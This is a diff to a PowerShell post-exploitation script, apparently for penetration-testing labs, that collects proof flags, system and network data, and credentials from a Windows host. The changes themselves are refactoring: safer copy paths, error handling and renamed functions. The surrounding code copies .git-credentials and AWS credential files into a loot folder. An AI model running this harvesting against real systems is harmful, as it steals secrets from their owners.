@@ -19,6 +19,8 @@
 #   .\lootr.ps1 -Help                 # show help
 #==============================================================================
 
+[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWriteHost', '', Justification='Interactive console output with color is intentional for this operator-facing script.')]
+[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseBOMForUnicodeEncodedFile', '', Justification='The script is intentionally stored as UTF-8 without BOM for cross-platform editing.')]
 param(
     [string]$OutDir = ".\loot",
     [switch]$Quick,
@@ -53,6 +55,21 @@ function Test-PhaseDone {
     param($Dir, $PhaseName)
     if (-not (Test-Path "$Dir\progress.log")) { return $false }
     return [bool](Select-String -Path "$Dir\progress.log" -Pattern "\| DONE \| $PhaseName \|" -Quiet)
+}
+
+function Get-SafeLootCopyPath {
+    param(
+        [string]$DestinationDir,
+        [string]$SourcePath
+    )
+
+    $leafName = Split-Path $SourcePath -Leaf
+    $safeSource = ($SourcePath -replace '[:\\/\s]', '_').Trim('_')
+    if (-not $safeSource) {
+        $safeSource = [guid]::NewGuid().ToString()
+    }
+
+    return Join-Path $DestinationDir ("{0}_{1}" -f $leafName, $safeSource)
 }
 
 #==============================================================================
@@ -95,8 +112,14 @@ if (-not $HostShort) { $HostShort = "unknown" }
 $LootDir = Join-Path $OutDir $HostShort
 
 $SubDirs = @("creds", "system", "network", "files", "proof")
-foreach ($sub in $SubDirs) {
-    $null = New-Item -ItemType Directory -Force -Path (Join-Path $LootDir $sub)
+try {
+    foreach ($sub in $SubDirs) {
+        $null = New-Item -ItemType Directory -Force -Path (Join-Path $LootDir $sub) -ErrorAction Stop
+    }
+} catch {
+    Write-Err "Failed to create output directory tree: $LootDir"
+    Write-Err $_
+    exit 1
 }
 
 Write-Host ""
@@ -135,6 +158,7 @@ function Invoke-PhaseProof {
         try {
             $matchResult = Get-Item -Path $pattern -ErrorAction SilentlyContinue
             foreach ($f in $matchResult) {
+                $proofCopy = Get-SafeLootCopyPath -DestinationDir $ProofDir -SourcePath $f.FullName
                 Write-Success "Found: $($f.FullName)"
                 $content = Get-Content $f.FullName -ErrorAction SilentlyContinue
                 Write-Host ""
@@ -144,7 +168,7 @@ function Invoke-PhaseProof {
                 Write-Host $content -ForegroundColor Green
                 Write-Host "========================================" -ForegroundColor Green
                 Write-Host ""
-                Copy-Item $f.FullName (Join-Path $ProofDir $f.Name) -ErrorAction SilentlyContinue
+                Copy-Item $f.FullName $proofCopy -ErrorAction SilentlyContinue
                 $FoundAny = $true
             }
         } catch {
@@ -160,8 +184,9 @@ function Invoke-PhaseProof {
             $results = Get-ChildItem -Path "C:\" -Recurse -Include "local.txt","proof.txt" `
                 -ErrorAction SilentlyContinue -Force | Select-Object -First 20
             foreach ($f in $results) {
+                $proofCopy = Get-SafeLootCopyPath -DestinationDir $ProofDir -SourcePath $f.FullName
                 Write-Success "Found (deep): $($f.FullName)"
-                Copy-Item $f.FullName (Join-Path $ProofDir $f.Name) -ErrorAction SilentlyContinue
+                Copy-Item $f.FullName $proofCopy -ErrorAction SilentlyContinue
                 $FoundAny = $true
             }
         } catch {
@@ -321,7 +346,7 @@ function Invoke-PhaseSystem {
 #==============================================================================
 # PHASE 3 — CREDENTIALS
 #==============================================================================
-function Invoke-PhaseCreds {
+function Invoke-PhaseCredential {
     Write-Phase "3 — CREDENTIALS"
     Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "creds" -Detail "Collecting credentials"
 
@@ -443,7 +468,8 @@ function Invoke-PhaseCreds {
         try {
             $matchResult = Get-Item -Path $gcp -ErrorAction SilentlyContinue
             foreach ($gf in $matchResult) {
-                Copy-Item $gf.FullName "$CDir\git_credentials_$(Split-Path $gf -Leaf).txt" -ErrorAction SilentlyContinue
+                $gitCopy = Get-SafeLootCopyPath -DestinationDir $CDir -SourcePath $gf.FullName
+                Copy-Item $gf.FullName $gitCopy -ErrorAction SilentlyContinue
                 Write-Success ".git-credentials: $($gf.FullName)"
             }
         } catch { $null = $_ }
@@ -459,7 +485,8 @@ function Invoke-PhaseCreds {
         try {
             $matchResult = Get-Item -Path $ap -ErrorAction SilentlyContinue
             foreach ($af in $matchResult) {
-                Copy-Item $af.FullName "$CDir\aws_credentials.txt" -ErrorAction SilentlyContinue
+                $awsCopy = Get-SafeLootCopyPath -DestinationDir $CDir -SourcePath $af.FullName
+                Copy-Item $af.FullName $awsCopy -ErrorAction SilentlyContinue
                 Write-Success "AWS credentials: $($af.FullName)"
             }
         } catch { $null = $_ }
@@ -720,7 +747,7 @@ function Invoke-PhaseNetwork {
 #==============================================================================
 # PHASE 5 — INTERESTING FILES (privesc vectors)
 #==============================================================================
-function Invoke-PhaseFiles {
+function Invoke-PhaseFile {
     Write-Phase "5 — INTERESTING FILES (PRIVESC VECTORS)"
     Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "files" -Detail "Searching for privesc vectors"
 
@@ -1079,9 +1106,9 @@ if ($Phase -ne "") {
     switch ($Phase.ToLower()) {
         "proof"   { Invoke-PhaseProof }
         "system"  { Invoke-PhaseSystem }
-        "creds"   { Invoke-PhaseCreds }
+        "creds"   { Invoke-PhaseCredential }
         "network" { Invoke-PhaseNetwork }
-        "files"   { Invoke-PhaseFiles }
+        "files"   { Invoke-PhaseFile }
         default {
             Write-Err "Unknown phase: $Phase"
             Write-Err "Valid phases: proof system creds network files"
@@ -1091,10 +1118,10 @@ if ($Phase -ne "") {
 } else {
     Invoke-PhaseProof
     Invoke-PhaseSystem
-    Invoke-PhaseCreds
+    Invoke-PhaseCredential
     Invoke-PhaseNetwork
     if (-not $Quick) {
-        Invoke-PhaseFiles
+        Invoke-PhaseFile
     } else {
         Write-Warn "Skipping files phase (Quick mode)"
     }
